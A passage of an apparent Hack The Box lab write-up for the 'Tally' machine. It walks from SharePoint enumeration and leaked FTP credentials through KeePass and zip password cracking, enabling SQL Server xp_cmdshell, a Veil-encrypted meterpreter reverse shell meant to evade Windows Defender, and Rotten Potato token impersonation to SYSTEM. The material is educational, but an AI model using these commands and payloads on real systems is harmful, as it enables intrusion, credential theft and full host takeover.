/lists.asmx (Status: 200)
/meetings.asmx (Status: 200)
/mysite/_layouts/mysite.aspx (Status: 200)
/news/_layouts/viewlsts.aspx (Status: 302)
/outlookadapter.asmx (Status: 200)
/permissions.asmx (Status: 200)
/search.asmx (Status: 200)
/searchcenter/_layouts/viewlsts.aspx (Status: 302)
/sitedata.asmx (Status: 200)
/sitedirectory/_layouts/viewlsts.aspx (Status: 302)
/shared documents/forms/allitems.aspx (Status: 200)
/sites.asmx (Status: 200)
/spscrawl.asmx (Status: 200)
/usergroup.asmx (Status: 200)
/userprofileservice.asmx (Status: 200)
/versions.asmx (Status: 200)
/views.asmx (Status: 200)
/webpartpages.asmx (Status: 200)
/webs.asmx (Status: 200)
/wpresources (Status: 301)
=====================================================

```

Great... so we can see we have a ton of stuff to look through. None of the `layouts` or `vti_bin` stuff looks particularly interesting. `/shared documents/forms/allitems.aspx` and `/sitedirectory/_layouts/viewlsts.aspx` do look like good ones to check. Let's start there.

![sitecontents](/img/tally-sitecontents.png)

We can see that there is one document and also a site page listed from the directory. If you click the links the server likes to rewrite the URL and insert in `_layouts/15/start.aspx#/`. If you remove it then you'll get to your correct destination. 

If we check out the Documents page, we are presented with the following:

![documents](/img/tally-documents.png)

Excellent, some ftp details. After downloading, we open and are presented with the following information:

```
FTP details
hostname: tally
workgroup: htb.local
password: UTDRSCH53c"$6hys
Please create your own user folder upon logging in
```

No username though. Let's check the site pages and see if there's anything there.

![sitepages](/img/tally-sitepages.png)

![financepage](/img/tally-financepage.png)

We now have the username and password to take a look at FTP. Let's log in.

```
root@kali:~/htb/tally# ftp 10.10.10.59
Connected to 10.10.10.59.
220 Microsoft FTP Service
Name (10.10.10.59:root): ftp_user
331 Password required
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-31-17  10:51PM       <DIR>          From-Custodian
10-01-17  10:37PM       <DIR>          Intranet
08-28-17  05:56PM       <DIR>          Logs
09-15-17  08:30PM       <DIR>          To-Upload
09-17-17  08:27PM       <DIR>          User
226 Transfer complete.

```

We're presented with a few directories, after digging for a while we find a few interesting things. First in Sarah's folder inside the User directory we find a note.

```
ftp> cd Sarah
250 CWD command successful.
ftp> ls
200 PORT command successful.
150 Opening ASCII mode data connection.
09-10-17  02:30PM              1818624 MBSASetup-x64-EN.msi
09-20-17  11:43PM                   89 notes.txt
09-15-17  08:02PM             44592848 Windows-KB890830-x64-V5.52.exe
226 Transfer complete.
ftp> get notes.txt
local: notes.txt remote: notes.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
89 bytes received in 0.05 secs (1.7551 kB/s)
```

```
root@kali:~/htb/tally# cat notes.txt 

done

install Sharepoint, replace Orchard CMS

to do

uninstall SQL Server 2016

```

Not of much use, but still good information to have. In Tim's folder we find something much more interesting.

```
ftp> cd Tim
250 CWD command successful.
ftp> ls
200 PORT command successful.
150 Opening ASCII mode data connection.
09-17-17  08:39PM       <DIR>          Files
09-02-17  07:08AM       <DIR>          Project
226 Transfer complete.
ftp> cd Files
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
09-15-17  07:58PM                   17 bonus.txt
09-15-17  08:24PM       <DIR>          KeePass-2.36
09-15-17  08:22PM                 2222 tim.kdbx
```

Let's grab that KeePass database and see if we can crack the password on it.

```
ftp> get tim.kdbx
local: tim.kdbx remote: tim.kdbx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2222 bytes received in 0.05 secs (42.3532 kB/s)
```

```
root@kali:~/htb/tally# keepass2john tim.kdbx > tim.keepasshash
root@kali:~/htb/tally# cat tim.keepasshash 
tim:$keepass$*2*6000*222*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da
```

Now that we have our hash we can run against hashcat. Remove `tim:` from the hash before trying to crack. I run hashcat on my Windows host.

```
C:\hashcat-3.5.0> .\hashcat64.exe -m 13400 .\timhash.txt .\rockyou.txt
hashcat (v3.5.0) starting...

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c
Watchdog: Temperature retain trigger disabled.

Dictionary cache hit:
* Filename..: .\rockyou.txt
* Passwords.: 14343296
* Bytes.....: 139921497
* Keyspace..: 14343296

$keepass$*2*6000*222*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da:simplementeyo

Session..........: hashcat
Status...........: Cracked
Hash.Type........: KeePass 1 (AES/Twofish) and KeePass 2 (AES)
Hash.Target......: $keepass$*2*6000*222*f362b5565b916422607711b54e8d0b...1cd7da
Time.Started.....: Fri Feb 16 15:15:48 2018 (2 secs)
Time.Estimated...: Fri Feb 16 15:15:50 2018 (0 secs)
Guess.Base.......: File (.\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:    20545 H/s (20.57ms)
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 56320/14343296 (0.39%)
Rejected.........: 0/56320 (0.00%)
Restore.Point....: 0/14343296 (0.00%)
Candidates.#1....: 123456 -> simple123
HWMon.Dev.#1.....: Temp: 46c Util: 99% Core:1137MHz Mem:2505MHz Bus:16

```

Tim's password is `simplementeyo`. Let's open up the database with Keepass. We find three entries. The only one of real interest is some share credentials.

![keepass](/img/tally-keepass.png)

Let's check these credentials with `smbclient`.

```
root@kali:~/htb/tally# smbclient \\\\10.10.10.59\\ACCT -U Finance
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\Finance's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Sep 18 01:58:18 2017
  ..                                  D        0  Mon Sep 18 01:58:18 2017
  Customers                           D        0  Sun Sep 17 16:28:40 2017
  Fees                                D        0  Mon Aug 28 17:20:52 2017
  Invoices                            D        0  Mon Aug 28 17:18:19 2017
  Jess                                D        0  Sun Sep 17 16:41:29 2017
  Payroll                             D        0  Mon Aug 28 17:13:32 2017
  Reports                             D        0  Fri Sep  1 16:50:11 2017
  Tax                                 D        0  Sun Sep 17 16:45:47 2017
  Transactions                        D        0  Wed Sep 13 15:57:44 2017
  zz_Archived                         D        0  Fri Sep 15 16:29:35 2017
  zz_Migration                        D        0  Sun Sep 17 16:49:13 2017

		8387839 blocks of size 4096. 676902 blocks available
```

Ah yes more folders to dig through. There is quite a bit of stuff here along with a few red herrings. 

First we find some SQL connection information inside the `zz_Archived` folder.

```
smb: \> cd zz_Archived
smb: \zz_Archived\> ls
  .                                   D        0  Fri Sep 15 16:29:35 2017
  ..                                  D        0  Fri Sep 15 16:29:35 2017
  2016 Audit                          D        0  Mon Aug 28 17:28:47 2017
  fund-list-2014.xlsx                 A    25874  Wed Sep 13 15:58:22 2017
  SQL                                 D        0  Fri Sep 15 16:29:36 2017

		8387839 blocks of size 4096. 676414 blocks available
smb: \zz_Archived\> cd SQL
smb: \zz_Archived\SQL\> ls
  .                                   D        0  Fri Sep 15 16:29:36 2017
  ..                                  D        0  Fri Sep 15 16:29:36 2017
  conn-info.txt                       A       77  Sun Sep 17 16:26:56 2017

		8387839 blocks of size 4096. 676269 blocks available
smb: \zz_Archived\SQL\> get conn-info.txt
getting file \zz_Archived\SQL\conn-info.txt of size 77 as conn-info.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

```
root@kali:~/htb/tally# cat conn-info.txt 
old server details

db: sa
pass: YE%TJC%&HYbe5Nw

have changed for tally
```

This information gets us nothing and is just a distraction. We also find an interesting zip file.

```
smb: \zz_Migration\Backup\20170808\> ls
  .                                   D        0  Sun Sep  3 10:18:18 2017
  ..                                  D        0  Sun Sep  3 10:18:18 2017
  orcharddb                           D        0  Sun Sep  3 10:23:16 2017

		8387839 blocks of size 4096. 674100 blocks available
smb: \zz_Migration\Backup\20170808\> cd orcharddb
smb: \zz_Migration\Backup\20170808\orcharddb\> ls
  .                                   D        0  Sun Sep  3 10:23:16 2017
  ..                                  D        0  Sun Sep  3 10:23:16 2017
  orcharddb.zip                       A     1012  Sun Sep  3 10:23:07 2017

		8387839 blocks of size 4096. 674099 blocks available
smb: \zz_Migration\Backup\20170808\orcharddb\> get orcharddb.zip
getting file \zz_Migration\Backup\20170808\orcharddb\orcharddb.zip of size 1012 as orcharddb.zip (0.7 KiloBytes/sec) (average 3.7 KiloBytes/sec)

```

The zip file is password protected. Let's crack it with `fcrackzip`.

```
root@kali:~/htb/tally# fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt orcharddb.zip 


PASSWORD FOUND!!!!: pw == Acc0unting


root@kali:~/htb/tally# unzip orcharddb.zip 
Archive:  orcharddb.zip
[orcharddb.zip] orcharddb.sql password: 
  inflating: orcharddb.sql           
root@kali:~/htb/tally# cat orcharddb.sql 
  /*    ==Scripting Parameters==

    Source Server Version : SQL Server 2016 (13.0.1601)
    Source Database Engine Edition : Microsoft SQL Server Enterprise Edition
    Source Database Engine Type : Standalone SQL Server

    Target Server Version : SQL Server 2017
    Target Database Engine Edition : Microsoft SQL Server Standard Edition
    Target Database Engine Type : Standalone SQL Server
*/
USE [orcharddb]
GO
/****** Object:  Table [dbo].[default_Orchard_Users_UserPartRecord]    Script Date: 03/09/2017 14:57:24 ******/
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO
CREATE TABLE [dbo].[default_Orchard_Users_UserPartRecord](
	[Id] [int] NOT NULL,
	[UserName] [nvarchar](255) NULL,
	[Email] [nvarchar](255) NULL,
	[NormalizedUserName] [nvarchar](255) NULL,
	[Password] [nvarchar](255) NULL,
	[PasswordFormat] [nvarchar](255) NULL,
	[HashAlgorithm] [nvarchar](255) NULL,
	[PasswordSalt] [nvarchar](255) NULL,
	[RegistrationStatus] [nvarchar](255) NULL,
	[EmailStatus] [nvarchar](255) NULL,
	[EmailChallengeToken] [nvarchar](255) NULL,
PRIMARY KEY CLUSTERED 
(
	[Id] ASC
)WITH (PAD_INDEX = OFF, STATISTICS_NORECOMPUTE = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS = ON, ALLOW_PAGE_LOCKS = ON) ON [PRIMARY]
) ON [PRIMARY]
GO
INSERT [dbo].[default_Orchard_Users_UserPartRecord] ([Id], [UserName], [Email], [NormalizedUserName], [Password], [PasswordFormat], [HashAlgorithm], [PasswordSalt], [RegistrationStatus], [EmailStatus], [EmailChallengeToken]) VALUES (2, N'admin', N'', N'admin', N'Finance2', N'Clear', N'SHA1', N's2Ieb5Pn7Vwf+X6JEXJitg==', N'Approved', N'Approved', NULL)
ALTER TABLE [dbo].[default_Orchard_Users_UserPartRecord] ADD  DEFAULT ('Approved') FOR [RegistrationStatus]
GO
ALTER TABLE [dbo].[default_Orchard_Users_UserPartRecord] ADD  DEFAULT ('Approved') FOR [EmailStatus]
GO

```

We can see the `INSERT` statement is adding the `admin` user with a password of `Finance2`. However we know from Sarah's note earlier that the Orchard CMS is gone and it certainly doesn't seem to be running on any of the ports. Again another red herring. 

Back to enumerating!

```
smb: \zz_Migration\Binaries\New folder\> ls
  .                                   D        0  Thu Sep 21 02:21:09 2017
  ..                                  D        0  Thu Sep 21 02:21:09 2017
  crystal_reports_viewer_2016_sp04_51051980.zip      A 389188014  Wed Sep 13 15:56:38 2017
  Macabacus2016.exe                   A 18159024  Mon Sep 11 17:20:05 2017
  Orchard.Web.1.7.3.zip               A 21906356  Tue Aug 29 19:27:42 2017
  putty.exe                           A   774200  Sun Sep 17 16:19:26 2017
  RpprtSetup.exe                      A   483824  Fri Sep 15 15:49:46 2017
  tableau-desktop-32bit-10-3-2.exe      A 254599112  Mon Sep 11 17:13:14 2017
  tester.exe                          A   215552  Fri Sep  1 07:15:54 2017
  vcredist_x64.exe                    A  7194312  Wed Sep 13 16:06:28 2017

		8387839 blocks of size 4096. 558580 blocks available

```

`tester.exe` looks interesting and seems to be custom. Let's download it and see what we can find out about it with `strings`

```
smb: \zz_Migration\Binaries\New folder\> get tester.exe
getting file \zz_Migration\Binaries\New folder\tester.exe of size 215552 as tester.exe (389.1 KiloBytes/sec) (average 389.1 KiloBytes/sec)
```

The output of strings is very long, but about midway we find what we need.

```
root@kali:~/htb/tally# strings tester.exe
!This program cannot be run in DOS mode.
Rich7J
~~~
~~~
SQLSTATE: 
Message: 
DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;
select * from Orchard_Users_UserPartRecord
~~~
~~~

```

Finally! The `sa` password!

```
root@kali:~/htb/tally# sqsh -S 10.10.10.59 -U sa
sqsh-2.1.7 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2010 Michael Peppler
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
Password: 
1>
```

Let's try to enable `xp_cmdshell` so we can get command execution on the box. _Note: you will probably have to renable this a few times, it seems to disable automatically after a certain period of time._

```
1> EXEC SP_CONFIGURE N'show advanced options', 1
2> go
Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
(return status = 0)
1> EXEC SP_CONFIGURE N'xp_cmdshell', 1
2> go
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
(return status = 0)
1> RECONFIGURE
2> go
```

We can test command execution now.

```
1> xp_cmdshell 'dir C:\';
2> go

	output                                                                  
----------------------------------------------------------

	 Volume in drive C has no label.                                        
	 Volume Serial Number is 8EB3-6DCB                                      
	NULL  

	 Directory of C:\  
	NULL                                                                                                                       

	18/09/2017  05:58    <DIR>          ACCT                                                      
	18/09/2017  20:35    <DIR>          FTP                                                       
	18/09/2017  21:35    <DIR>          inetpub                                                     
	16/07/2016  13:23    <DIR>          PerfLogs                                                       
	24/12/2017  01:46    <DIR>          Program Files                                                   
	19/10/2017  22:09    <DIR>          Program Files (x86)                                           
	01/10/2017  19:46    <DIR>          TEMP                                                           
	12/10/2017  20:28    <DIR>          Users                                                           
	23/10/2017  20:44    <DIR>          Windows                                                        
	               0 File(s)              0 bytes                                       
	               9 Dir(s)   2,260,242,432 bytes free
```

If we try to execute certain commands we get the following error:

```
1> xp_cmdshell 'systeminfo';
2> go

	output                                                                                                                                                                                               
                                                          

	-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------

	The current directory is invalid.                                                                                                                                                                    
                                                          

NULL  
```
To work around this we can prepend our commands by changing directories to `C:\`.

```
1> xp_cmdshell 'cd C:\ & systeminfo';
2> go

	output                                                                              
----------------------------------------------------------

	NULL                                                                             
	Host Name:                 TALLY                                                   
	OS Name:                   Microsoft Windows Server 2016 Standard
	OS Version:                10.0.14393 N/A Build 14393 
	OS Manufacturer:           Microsoft Corporation  
	OS Configuration:          Standalone Server 
	OS Build Type:             Multiprocessor Free 
	Registered Owner:          Windows User       
	Registered Organization:                      
	Product ID:                00376-30726-67778-AA877
	Original Install Date:     28/08/2017, 15:43:34   
	System Boot Time:          17/02/2018, 20:05:52      

	System Manufacturer:       VMware, Inc.   
	System Model:              VMware Virtual Platform    

	System Type:               x64-based PC   
	Processor(s):              2 Processor(s) Installed.    

	                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2600 Mhz       

	                           [02]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2600 Mhz    

	BIOS Version:              Phoenix Technologies LTD 6.00, 05/04/2016 

	Windows Directory:         C:\Windows                

	System Directory:          C:\Windows\system32       

	Boot Device:               \Device\HarddiskVolume1    

	System Locale:             en-gb;English (United Kingdom) 

	Input Locale:              en-gb;English (United Kingdom) 

	Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London                                               

	Total Physical Memory:     2,047 MB  
	Available Physical Memory: 231 MB                                                                            
	Virtual Memory: Max Size:  4,458 MB    
	Virtual Memory: Available: 657 MB                    

	Virtual Memory: In Use:    3,801 MB                  

	Page File Location(s):     C:\pagefile.sys           

	Domain:                    HTB.LOCAL                

	Logon Server:              \\TALLY       
	Hotfix(s):                 2 Hotfix(s) Installed. 
	                           [01]: KB3199986           

	                           [02]: KB4015217           

	Network Card(s):           1 NIC(s) Installed.  
	                           [01]: Intel(R) 82574L Gigabit Network Connection                                                   
	                                 Connection Name: Ethernet0  

	                                 DHCP Enabled:    No  

	                                 IP address(es)     

	                                 [01]: 10.10.10.59   

	                                 [02]: fe80::c5bc:7321:fb5d:9066

	                                 [03]: dead:beef::c5bc:7321:fb5d:9066  
                                                          

Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

We have a Server 2016 box which most likely means that if we try to upload a payload generated by `msfvenom` it's probably going to get caught by Windows Defender. There's actually a note on Sarah's desktop confirming she enabled Defender and also patched the system.

```
1> xp_cmdshell 'type C:\Users\Sarah\Desktop\todo.txt';
2> go

done:

install updates
check windows defender enabled

outstanding:

update intranet design
update server inventory
```


To get around this we can use [Veil](https://github.com/Veil-Framework/Veil). I used the `python/shellcode_inject/aes_encrypt.py` payload for a `windows/meterpreter/reverse_tcp` connection. 

After generating the exe we can upload via FTP to the `Intranet` folder. We know we have write permissions there from the instructions on the SharePoint Finance page from earlier.

```
root@kali:~/htb/tally# ftp 10.10.10.59
Connected to 10.10.10.59.
220 Microsoft FTP Service
Name (10.10.10.59:root): ftp_user
331 Password required
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> cd intranet
250 CWD command successful.
ftp> bin
200 Type set to I.
ftp> put tallyshell.exe
local: tallyshell.exe remote: tallyshell.exe
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
4769528 bytes sent in 29.98 secs (155.3659 kB/s)
```

Now we can start our handler in Metasploit.

```
msf exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 10.10.14.12
LHOST => 10.10.14.12

msf exploit(multi/handler) > run
	
[*] Started reverse TCP handler on 10.10.14.12:4444 
```

Execute our payload via SQL.

```
1> xp_cmdshell 'cd C:\FTP\Intranet\ & tallyshell.exe';
2> go
```

```
[*] Sending stage (179779 bytes) to 10.10.10.59
[*] Meterpreter session 1 opened (10.10.14.12:4444 -> 10.10.10.59:56560 at 2018-02-18 14:31:45 -0500

meterpreter > shell
Process 1524 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\FTP\Intranet>whoami
whoami
tally\sarah
```

Woohoo! Finally we have a shell!

## Privilege Escalation

We find some more red herrings on Sarah's desktop.

```
C:\Users\Sarah\Desktop>type browser.bat
type browser.bat

del C:\Users\Sarah\Desktop\session_id.txt

REM output current session information to file
qwinsta | findstr ">" > C:\Users\Sarah\Desktop\session_id.txt

REM query file for session id
FOR /F "tokens=3" %%a IN (C:\Users\Sarah\Desktop\session_id.txt) DO SETsessionid=%%a

del C:\Users\Sarah\Desktop\session_id.txt

REM only if console user, enter loop
if %sessionid% EQU 1 goto LOOP
if %sessionid% GTR 1 goto EXIT

:LOOP

REM kill any open instances of firefox and crashreporter
taskkill /F /IM firefox.exe > nul 2>&1
taskkill /F /IM crashreporter.exe > nul 2>&1

REM copy latest mockups to webroot
copy /Y C:\FTP\Intranet\index.htmlC:\inetpub\wwwroot\HRTJYKYRBSHYJ\index.html

REM browse file
start "" "C:\Program Files (x86)\Mozilla Firefox\Firefox.exe""http://127.0.0.1:81/HRTJYKYRBSHYJ/index.html"

REM wait
ping 127.0.0.1 -n 80 > nul

if not ErrorLevel 1 goto :LOOP

:EXIT
exit
```

This `bat` file gets ran at startup but it's running the processes as Sarah so that doesn't do it much good. The version of Firefox also seems to be vulnerable, however it's not much use to us. There's also some SharePoint Service warm up script and xml on the desktop, but again this is useless.

What is interesting is Sarah's account is running as the SQL service account. So maybe we can elevate with this knowledge since service accounts usually have special privileges.

<https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/>

I won't go into the details on how this exploit works, the article above explains it far better than I ever could.

Let's check our privileges with meterpreter.

```
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
```

Excellent, it looks like we have the privileges we need to perform the attack. Let's upload `rottenpotato.exe` to the Intranet folder via FTP.

```
root@kali:~/htb/tally# ftp 10.10.10.59
Connected to 10.10.10.59.
220 Microsoft FTP Service
Name (10.10.10.59:root): ftp_user
331 Password required
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> bin
200 Type set to I.
ftp> cd intranet
250 CWD command successful.
ftp> put rottenpotato.exe
local: rottenpotato.exe remote: rottenpotato.exe
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
679936 bytes sent in 1.58 secs (420.3189 kB/s)
```

Back on our meterpreter session we load the `incognito` extension.

```
meterpreter > use incognito
Loading extension incognito...Success.
meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will beavailable
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
NT SERVICE\SQLSERVERAGENT
NT SERVICE\SQLTELEMETRY
TALLY\Sarah

Impersonation Tokens Available
========================================
No tokens available
```

We can see we currently have no Impersonation Tokens. Let's run the Rotten Potato exploit.

```
meterpreter > cd C:\\FTP\\Intranet
meterpreter > execute -f rottenpotato.exe -Hc
Process 3104 created.
Channel 2 created.
meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will beavailable
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
NT SERVICE\SQLSERVERAGENT
NT SERVICE\SQLTELEMETRY
TALLY\Sarah

Impersonation Tokens Available
========================================
NT AUTHORITY\SYSTEM
```

We need to quickly impersonate the token or it will disappear.

```
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
[-] Warning: Not currently running as SYSTEM, not all tokens will beavailable
             Call rev2self if primary process token is SYSTEM
[-] No delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Success! We have our SYSTEM shell and can grab the root.txt file!